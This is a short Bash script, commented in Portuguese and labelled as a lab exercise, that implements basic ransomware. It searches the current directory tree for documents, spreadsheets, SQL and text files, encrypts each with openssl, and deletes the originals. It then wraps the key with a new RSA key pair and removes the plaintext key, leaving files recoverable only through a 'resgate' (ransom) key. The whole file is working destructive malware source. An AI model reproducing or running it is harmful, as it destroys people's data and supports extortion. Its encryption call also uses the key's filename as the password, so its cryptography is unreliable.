#!/bin/bash
#################################
# Autor: Rafael Vergani 	#
# https://github.com/vergani 	#
#################################

# local e exntesões de arquivos que serão atacadas neste lab:
#arquivos=$(ls *.txt *.tar *.gzip *.doc *.docx *.xls *.xlsx *.ppt *.pptx *.sql 2>/dev/null)
arquivos=$(find $(pwd) -print | egrep ".txt|.sql|.xls|.doc|.pdf")

# variavel que vai armazenar chave privada para decriptar
chave=$(/usr/bin/dbus-uuidgen)

echo $chave > chave.key

# vamos ler todos os arquivos da pasta desejada, exceto arquivos que vou precisar depois:
for file in $arquivos
do
	# agora vamos encriptar tudo usando a chave desejado
	openssl enc -in $file -out $file".cry" -aes-256-cbc -pbkdf2 -k chave.key 
	echo "[+] $file"
	rm $file

done

# vamos gerar um nova chave para proteger minha chave privada que precisareis depois no resgate
openssl genrsa -out resgate.pem 4096

# extrair a chave publica que vai ser para encriptar a "chave da chave"
openssl rsa -in resgate.pem -outform PEM -pubout -out resgate-pub.pem

# vamos pegar a chave simetrica e encriptar usando a chave publica recém criada
openssl rsautl -in chave.key -out chave.enc -encrypt -pubin -inkey resgate-pub.pem

# remover a chave privada temporaria
rm -rf chave.key
rm -rf resgate-pub.pem

# agora preciso apenas ter em mãos num local seguro remoto a chave privada que decripta a chave de resgate
#mv resgate.pem /home/vergani/
